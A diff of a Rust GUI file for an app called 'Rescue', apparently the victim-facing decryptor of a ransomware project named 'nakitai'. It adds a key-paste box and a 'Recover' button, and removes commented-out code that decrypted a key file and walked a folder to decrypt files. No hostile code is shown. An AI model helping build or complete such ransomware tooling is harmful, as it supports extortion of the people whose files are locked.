@@ -1,28 +1,21 @@
-mod utils;
-
-use base64::decode;
-use druid::piet::util::line_number_for_position;
 use druid::piet::InterpolationMode;
 use druid::widget::{Button, FillStrat, Image, SizedBox};
 use druid::{
     widget::{Flex, Label, TextBox},
-    AppLauncher, Color, Data, Env, ImageBuf, Lens, LocalizedString, Menu, Widget, WidgetExt,
-    WindowDesc, WindowId,
+    AppLauncher, Data, ImageBuf, Lens, LocalizedString, Widget, WidgetExt, WindowDesc,
 };
-use openssl::rsa::Rsa;
 use std::sync::Arc;
-use std::{fs::File, io::Read};
-use utils::{crypto, traverse};
 
 const WINDOW_TITLE: LocalizedString<AppState> = LocalizedString::new("Rescue ( •̀ᴗ•́)و ̑̑");
 
 #[derive(Clone, Data, Lens)]
 struct AppState {
+    is_decrypting: Arc<bool>,
     private_key_encoded_str: Arc<String>,
 }
 
 fn build_root_ui() -> impl Widget<AppState> {
-    let png_data_raw = include_bytes!("./assets/top.png");
+    let png_data_raw = include_bytes!("../assets/top.png");
     let png_data = ImageBuf::from_data(png_data_raw).unwrap();
     let mut img = Image::new(png_data).fill_mode(FillStrat::Cover);
     img.set_interpolation_mode(InterpolationMode::Bilinear);
@@ -42,8 +35,14 @@ fn build_root_ui() -> impl Widget<AppState> {
                 .with_line_break_mode(druid::widget::LineBreaking::WordWrap),
         );
 
-    let button = Button::new("Recover")
-        .on_click(|_ctx, data, _env| println!("click"));
+    let button = SizedBox::new(
+        Button::new("Recover")
+            .on_click(|_ctx, data: &mut AppState, _env| {
+                data.is_decrypting = true.into();
+            })
+            .disabled_if(|data: &AppState, _env| *data.is_decrypting),
+    )
+    .fix_height(28.0);
 
     let textbox_wrap = Flex::row()
         .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
@@ -51,20 +50,12 @@ fn build_root_ui() -> impl Widget<AppState> {
             TextBox::multiline()
                 .with_placeholder("Paste here")
                 .lens(AppState::private_key_encoded_str)
+                .disabled_if(|data: &AppState, _env| *data.is_decrypting)
                 .expand_width(),
             1.0,
         )
+        .with_child(SizedBox::empty().fix_width(8.))
         .with_child(button);
-
-    /*return Flex::column()
-    .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
-    .with_child(label_wrap)
-    .with_spacer(8.0)
-    .with_child(
-        Flex::row()
-            .with_flex_child(Flex::column().with_child(Label::new("Hola").expand_width()), 1.0)
-            .with_child(Flex::column().with_child(button)),
-    );*/
 
     Flex::column()
         .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
@@ -82,18 +73,6 @@ fn build_root_ui() -> impl Widget<AppState> {
 }
 
 fn main() -> Result<(), anyhow::Error> {
-    let og_private_key_b = include_bytes!("../private.pem");
-    let og_private_key = Rsa::private_key_from_pem(&og_private_key_b.as_slice())?;
-
-    /*let mut encrypted_nakitai_key_encoded_buffer = Vec::new();
-    let mut encoded_nakitai_key_file = File::open("D:\\sample\\decrypt_key.nky")?;
-
-    encoded_nakitai_key_file.read_to_end(&mut encrypted_nakitai_key_encoded_buffer)?;
-
-    let encrypted_nakitai_key = decode(&encrypted_nakitai_key_encoded_buffer)?;
-
-    let private_key = crypto::decrypt_private_key(256, &og_private_key, &encrypted_nakitai_key)?;
-*/
     let main_window = WindowDesc::new(build_root_ui())
         .title(WINDOW_TITLE)
         .resizable(false)
@@ -101,6 +80,7 @@ fn main() -> Result<(), anyhow::Error> {
 
     // create the initial app state
     let state = AppState {
+        is_decrypting: false.into(),
         private_key_encoded_str: "".to_string().into(),
     };
 
@@ -109,16 +89,6 @@ fn main() -> Result<(), anyhow::Error> {
         .log_to_console()
         .launch(state)
         .expect("Failed to launch application");
-
-    /*traverse::find_encrypted_files("D:\\sample", |entry, _| {
-        let file_path = entry.path().display().to_string();
-        match crypto::decrypt_file(&file_path, 256, &private_key) {
-            Ok(_) => {}
-            Err(err) => {
-                println!("err!!! => [{:?}] {:?}", file_path, err)
-            }
-        }
-    });*/
 
     Ok(())
 }
